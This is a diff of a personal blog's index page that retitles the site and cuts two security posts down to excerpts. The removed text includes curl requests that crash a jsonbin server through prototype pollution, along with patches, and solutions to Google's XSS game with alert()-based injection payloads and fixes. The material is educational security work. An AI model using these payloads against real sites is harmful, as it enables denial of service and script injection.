@@ -18,13 +18,13 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"kccarlos.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"kccarlos.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
 
     <meta name="description" content="Curiosity">
 <meta property="og:type" content="website">
-<meta property="og:title" content="KCCarlos&#39;s Notes">
+<meta property="og:title" content="KC Blog">
 <meta property="og:url" content="https://kccarlos.github.io/index.html">
-<meta property="og:site_name" content="KCCarlos&#39;s Notes">
+<meta property="og:site_name" content="KC Blog">
 <meta property="og:description" content="Curiosity">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="kccarlos">
@@ -38,7 +38,7 @@
 <script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>KCCarlos's Notes</title>
+<title>KC Blog</title>
   
 
 
@@ -69,7 +69,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">KCCarlos's Notes</h1>
+      <h1 class="site-title">KC Blog</h1>
       <i class="logo-line"></i>
     </a>
   </div>
@@ -196,17 +196,17 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="KCCarlos's Notes">
+      <meta itemprop="name" content="KC Blog">
       <meta itemprop="description" content="Curiosity">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | KCCarlos's Notes">
+      <meta itemprop="name" content="undefined | KC Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/06/Prototype-Pollution-Example-Exploit-and-Patching/" class="post-title-link" itemprop="url">Prototype Pollution Example - Exploit and Patching</a>
+          <a href="/2022/11/06/Prototype-Pollution-Example-Exploit-and-Patching/" class="post-title-link" itemprop="url">Prototype Pollution - an Exploit and Patching Example</a>
         </h2>
 
         <div class="post-meta-container">
@@ -216,9 +216,8 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-11-06 18:23:47 / Modified: 18:29:59" itemprop="dateCreated datePublished" datetime="2022-11-06T18:23:47-05:00">2022-11-06</time>
+      <time title="Created: 2022-11-06 18:23:47" itemprop="dateCreated datePublished" datetime="2022-11-06T18:23:47-05:00">2022-11-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -240,47 +239,16 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>This article provides an DDoS attack example that exploit the prototype pollution vulnerability.</p>
-<p>Two versions of patch <a target="_blank" rel="noopener" href="https://github.com/kccarlos/prototypepollutionpatching">code</a> is also provided. </p>
-<h2 id="Install-and-Usage"><a href="#Install-and-Usage" class="headerlink" title="Install and Usage"></a>Install and Usage</h2><h3 id="Run-the-vulnerable-code"><a href="#Run-the-vulnerable-code" class="headerlink" title="Run the vulnerable code"></a>Run the vulnerable code</h3><ul>
-<li><p>Dependencies: MongoDB, NodeJS, NPM</p>
-</li>
-<li><p>Before installation, register your app with GitHub to obtain an authorization token using this <a target="_blank" rel="noopener" href="https://docs.github.com/en/developers/apps/building-oauth-apps/creating-an-oauth-app">guide</a>.</p>
-</li>
-<li><p>Project code with installation instructions: <a target="_blank" rel="noopener" href="https://github.com/remy/jsonbin">https://github.com/remy/jsonbin</a></p>
-</li>
-<li><p>Follow the instruction in <a target="_blank" rel="noopener" href="https://jsonbin.org/">https://jsonbin.org</a> to use the service.</p>
-</li>
-</ul>
-<h3 id="Run-the-patched-code"><a href="#Run-the-patched-code" class="headerlink" title="Run the patched code"></a>Run the patched code</h3><ol>
-<li>Make sure that dependencies are installed (MongoDB, NodeJS, NPM). Also your app is registered with GitHub using this <a target="_blank" rel="noopener" href="https://docs.github.com/en/developers/apps/building-oauth-apps/creating-an-oauth-app">guide</a>.</li>
-<li>Download the code: <code>git clone https://github.com/kccarlos/prototypepollutionpatching.git</code></li>
-<li>Navigate to the project folder <code>cd prototypepollutionpatching/patchv1</code> or <code>cd prototypepollutionpatching/patchv2</code> (Two versions provided)</li>
-<li>run <code>npm install</code></li>
-<li>Set the configurations in <code>.dev.env</code> before running. An example is provided in <code>example.env</code></li>
-</ol>
-<h2 id="Exploit-the-Vulnerability"><a href="#Exploit-the-Vulnerability" class="headerlink" title="Exploit the Vulnerability"></a>Exploit the Vulnerability</h2><p><em><strong>!!! Be ethical: do not exploit the real website. Please install and run the source code and try the following exploit on your own machine.</strong></em></p>
-<p><strong>Vulnerability 1</strong>: exploiting the <code>/Patch</code> route</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://[DOMAIN:PORT]/[GITHUB_USERNAME]/foo \</span><br><span class="line">     -H <span class="string">&#x27;authorization: token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;  &#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -X PATCH http://[DOMAIN:PORT]/[GITHUB_USERNAME]/foo \</span><br><span class="line">   -H <span class="string">&#x27;authorization: token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span> \</span><br><span class="line">   -d <span class="string">&#x27;&#123; &quot;__proto__&quot; : &#123; &quot;toString&quot; : &quot;attack&quot;&#125; &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>Vulnerability 2</strong>: exploiting the <code>/Post</code> route</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -X POST http://[DOMAIN:PORT]/[GITHUB_USERNAME]/__proto__/toString \</span><br><span class="line">    -H <span class="string">&#x27;authorization: token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span> \</span><br><span class="line">    -d <span class="string">&#x27;&quot;attack&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>After this attack, the server cannot response to requests. Therefore an DDos attack is completed.</p>
-<h2 id="Patch-Version-1"><a href="#Patch-Version-1" class="headerlink" title="Patch Version 1"></a>Patch Version 1</h2><p>The vulnerable code is <code>undefsafe()</code> and <code>jsonmergepatch()</code> in <code>lib/routes/api.js</code>.</p>
-<p>To fix this issue, we may add a checking command before these functions are called in <code>router.patch()</code>:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(<span class="literal">null</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>In <code>router.post()</code>, there is a easier way to fix the vulnerability: checking the URL of the request.</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.<span class="property">path</span>.<span class="title function_">includes</span>(<span class="string">&#x27;__proto__&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Code is available in <code>./patchv1</code>.</p>
-<h2 id="Patch-Version-2"><a href="#Patch-Version-2" class="headerlink" title="Patch Version 2"></a>Patch Version 2</h2><p>We may patch the  vulnerability using <code>Object.prototype.freeze()</code>. First, we freeze the base object’s prototype property before executing <code>undefsafe()</code> and <code>jsonmergepatch()</code> in both <code>router.patch()</code> and <code>router.post()</code> functions:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure>
-
-<p>Now the server will not fail and cause DDoS due to the vulnerability in <code>/Patch</code> and <code>/Post</code>.</p>
-<p>Full code is available in <code>./patchv2</code>.</p>
-
+          <p><img src="/uploads/prototype-pollution.png" alt="Prototype Pollution"></p>
+<p>This article discusses an DDoS attack example that exploit the prototype pollution vulnerability.</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/11/06/Prototype-Pollution-Example-Exploit-and-Patching/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -314,12 +282,12 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="KCCarlos's Notes">
+      <meta itemprop="name" content="KC Blog">
       <meta itemprop="description" content="Curiosity">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | KCCarlos's Notes">
+      <meta itemprop="name" content="undefined | KC Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -336,13 +304,6 @@
       <span class="post-meta-item-text">Posted on</span>
 
       <time title="Created: 2022-10-15 15:25:07" itemprop="dateCreated datePublished" datetime="2022-10-15T15:25:07-04:00">2022-10-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-11-06 18:25:32" itemprop="dateModified" datetime="2022-11-06T18:25:32-05:00">2022-11-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -364,122 +325,21 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>This blog discusses</p>
+          <p><img src="/uploads/xss.png" alt="XSS"></p>
+<p>This article discusses</p>
 <ul>
 <li>Solutions to Google’s <a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">XSS game</a></li>
 <li>Re-implementation and patching code in Python Flask, HTML&#x2F;CSS and JavaScript</li>
 <li>Some thoughts on using Content Security Policy to defense the code</li>
 </ul>
-<p>If you want the code, go to <a target="_blank" rel="noopener" href="https://github.com/kccarlos/googlexssgame">this repo</a>. So let’s dive in!</p>
-<h2 id="Preface-Unable-to-Advance-to-Level-2"><a href="#Preface-Unable-to-Advance-to-Level-2" class="headerlink" title="Preface Unable to Advance to Level 2"></a>Preface Unable to Advance to Level 2</h2><p>As of October 2022, the game server has a bug. You may find yourself unable to advance to the next level after cracking the first level puzzle. This is because the game server will send a cookie that has already expired. Then, the the browser will discard it after checking the date.</p>
-<p>One solution is to <strong>capture the packet and modify the cookie date before the packet reach the browser</strong>. You can use the packet capturing tools like <a target="_blank" rel="noopener" href="https://portswigger.net/burp/communitydownload">Brup Suite Community Edition</a>. This screenshot shows a server response of one of my submission. Note that the cookie expire date is 22&#x2F;<strong>Jul</strong>&#x2F;2022 12:34:56 GMT (highlighted in orange color).</p>
-<p><img src="/uploads/package_capturing.png" alt="packagecapturing"></p>
-<p>Then, manually change it to a future date and forward the package. In my case, I changed it to 22&#x2F;Oct&#x2F;2022 12:34:56 GMT. Then, the browser will keep this cookie and attach it to the next request for next level.</p>
-<p>Another possible solution is to <strong>change the computer time of the browser to before 2&#x2F;Jul&#x2F;2022 12:34:56 GMT</strong>. In this way, you can avoid the hassle of repetitively modifying the cookie each time you advance to the next level.</p>
-<h2 id="XSS-Game-Solutions"><a href="#XSS-Game-Solutions" class="headerlink" title="XSS Game Solutions"></a>XSS Game Solutions</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><ul>
-<li>Vulnerable code is as follows. The website directly take the input from a user and render it as part of the website with no sanitization. As a result, the browser will think the user input is part of the code and execute it.</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="string">&quot;Sorry, no results were found for &lt;b&gt;&quot;</span> + query + <span class="string">&quot;&lt;/b&gt;.&quot;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>How to trigger the vulnerability? input the following string in the search bar and click on search.</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><ul>
-<li>Vulnerable code: again the user’s input does not have sanitization and is stored in <code>post[i].message</code></li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html += <span class="string">&quot;&lt;blockquote&gt;&quot;</span> + posts[i].<span class="property">message</span> + <span class="string">&quot;&lt;/blockquote&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>How to trigger the vulnerability: input the following string in the textfield and click on “Share status!”. The browser will execute this new code and try to find <code>image.gif</code>. It will fail and trigger <code>alert()</code></li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image.gif&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><ul>
-<li>Vulnerable code: this web app will directly take the section that follows <code>#</code> of the URL and pass it into  <code>chooseTab()</code>. <code>chooseTab()</code> will directly embed it into the image tag.</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">chooseTab</span>(<span class="built_in">unescape</span>(self.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>)) || <span class="string">&quot;1&quot;</span>);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">//in chooseTab</span></span><br><span class="line">html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>How to trigger the vulnerability: navigate to this URL. Here, the first <code>&#39;</code> will end the image src string. Since the browser cannot find <code>/static/level3/cloud</code>, it will run the function following <code>onerror</code> and trigger <code>alert()</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level3/frame#$(&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;)</span><br></pre></td></tr></table></figure>
-
-<h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><ul>
-<li>Vulnerable code: this web app will take the user input and pass it to <code>startTimer()</code>. <code>startTimer()</code> will directly use this input.</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/loading.gif&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">function startTimer(seconds) &#123;</span><br><span class="line">   seconds = parseInt(seconds) || 3;</span><br><span class="line">... &#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>How to trigger the vulnerability. Input the following in the text field. <code>3&#39;)</code> will finish the <code>startTimer()</code> function. Then, it will inject an alert function and get executed.</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span><span class="string">&#x27;); alert(&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><ul>
-<li>Vulnerable code: this web app will take the user get request and find out the parameter of <code>next</code>. Then, in HTML it will use it as a hyperlink directly</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">render_template</span>(<span class="string">&#x27;confirm.html&#x27;</span>, &#123;<span class="string">&#x27;next&#x27;</span>: self.<span class="property">request</span>.<span class="title function_">get</span>(<span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;welcome&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">&lt;a href=<span class="string">&quot;&#123;&#123; next &#125;&#125;&quot;</span>&gt;<span class="title class_">Next</span> &gt;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>How to trigger the vulnerability: navigate to this URL and click on <code>Next &gt;&gt;</code>. Here we make the parameter of <code>next</code> become <code>javascript:alert()</code>, so the hyperlink <code>href=&quot;javascript:alert()&quot;</code> will make browser to run <code>alert()</code> as javascript code.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert();</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h3><ul>
-<li>Vulnerable code: this web app will take the section that follows <code>#</code> of the URL in <code>getGadgetName()</code>. Then attempt to load this URL as javascript.</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">includeGadget</span>(<span class="title function_">getGadgetName</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getGadgetName</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>) || <span class="string">&quot;/static/gadget.js&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In includeGadget</span></span><br><span class="line"><span class="keyword">var</span> scriptEl = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">...</span><br><span class="line">scriptEl.<span class="property">src</span> = url;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>How to trigger the vulnerability: navigate to this URL. Here the <code>//www.google.com/jsapi?callback=alert</code> contains script to trigger <code>alert()</code>. Even though the script added a regular expression to check if the URL contains <code>http</code>, it cannot stop this attack because no <code>http</code> keyword is included. When browser notice that no protocal is given, it will add it automatically. Using <code>hTtp://..</code> is also OK since it’s case insensitive.</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert</span><br></pre></td></tr></table></figure>
-
-<h2 id="Patching"><a href="#Patching" class="headerlink" title="Patching"></a>Patching</h2><h3 id="How-to-run-code"><a href="#How-to-run-code" class="headerlink" title="How to run code"></a>How to run code</h3><ul>
-<li>To run the code of level 1, go to <code>l1</code> folder and start the flask server. (For level X, go to <code>lx</code>. For example, level 2 is at <code>src/patch/l2</code>.</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd code/patch/l1</span><br><span class="line">python -m flask --app level1 run</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Then, navigate to <a target="_blank" rel="noopener" href="https://localhost:5000/">https://localhost:5000</a> to view the web app</li>
-</ul>
-<h3 id="Level-1-1"><a href="#Level-1-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>To ensure that the users’ input is properly escaped, I used the <code>markupSafe</code> library coming along with Flask.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> markupsafe <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">query = escape(request.args.get(<span class="string">&#x27;query&#x27;</span>))</span><br><span class="line">message = <span class="string">f&quot;Sorry, no results were found for &lt;b&gt; <span class="subst">&#123;query&#125;</span> &lt;/b&gt;.&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p><code>escape()</code> will return a markup object that ensure that any string used along with it will be properly escaped. For example, <code>&lt;script&gt;alert()&lt;/script&gt;</code> will become <code>&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;</code>. In this way, the user’s input will be treated plaintext instead of HTML-meaningful tags.</p>
-<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>Similar to task 1, the patch is to replace the special characters so that browser will treat it as plaintext. Here, in Line 38 of <code>index.html</code>, I added two <code>replace()</code> methods to replace <code>&lt;</code> and <code>&gt;</code> into <code>&amp;lt;</code> and <code>&amp;gt;</code> respectively.</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encoded = posts[i].<span class="property">message</span>.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&quot;&amp;lt;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line">html += <span class="string">&quot;&lt;blockquote&gt;&quot;</span> + encoded + <span class="string">&quot;&lt;/blockquote&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>To prevent URL injection, my patch is to parse the user’s input URL first. If a number cannot be extracted (potentially having some unexpected characters following the number), then the user will be redirected to tab 1.</p>
-<p>Therefore, in Line 38 of <code>index.html</code>, I added a <code>parseInt()</code> function to process the user input as number. Then, a if condition will decide if the number is an expected one.</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="built_in">unescape</span>(<span class="built_in">parseInt</span>(self.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>)))</span><br><span class="line"><span class="keyword">if</span> ((num == <span class="number">1</span>) || (num == <span class="number">2</span>) || (num == <span class="number">3</span>)) &#123;<span class="title function_">chooseTab</span>(num)&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;<span class="title function_">chooseTab</span>(<span class="number">1</span>)&#125;;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Level-4-1"><a href="#Level-4-1" class="headerlink" title="Level 4"></a>Level 4</h3><p>My patch is to parse the user’s input URL first by trying to cast it into an integer. If an integer cannot be obtained (potentially having some unexpected characters following the number), then the user will be redirected to front page to ask for another input.</p>
-<p>Therefore, in Line 13 of <code>level4.py</code>, I added a <code>int()</code> function to process the user input into integer. The <code>try</code> statement will catch any error in the integer casting. Only integer will be proceeded with next page.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    timer = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;timer&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;timer.html&#x27;</span>, timer=timer)</span><br></pre></td></tr></table></figure>
-
-<h3 id="Level-5-1"><a href="#Level-5-1" class="headerlink" title="Level 5"></a>Level 5</h3><p>My patch is to check the user’s input URL against all available routes. If it cannot match any of the routes, the client will be redirect to main page.</p>
-<p>Therefore, in both Line 18 and Line 25 of <code>level5.py</code>, I added an <code>if</code> clause to check user’s URL. So the value of <code>next</code> will be confined to avoid exploit.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">availableRoutes = [<span class="string">&#x27;signup&#x27;</span>, <span class="string">&#x27;confirm&#x27;</span>, <span class="string">&#x27;welcome&#x27;</span>]</span><br><span class="line">...</span><br><span class="line"><span class="built_in">next</span> = request.args.get(<span class="string">&#x27;next&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">next</span> <span class="keyword">in</span> availableRoutes:</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;signup.html&#x27;</span>, <span class="built_in">next</span>=<span class="built_in">next</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/welcome&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="Level-6-1"><a href="#Level-6-1" class="headerlink" title="Level 6"></a>Level 6</h3><p>My patch is to use a regular expression to enforce that only files inside static folder are acceptable.</p>
-<p>In Line 22 <code>index.html</code>, the original code has a regular expression that looks for link starting with http. The new regular expression ensures that only urls like <code>#/static/*</code> is acceptable.</p>
-<p>For example:</p>
-<ul>
-<li><code>http://localhost:5000/#/static/gadget.js</code> will be accepted.</li>
-<li><code>http://localhost:5000/#//www.google.com/jsapi?callback=alert</code> will be rejected.</li>
-</ul>
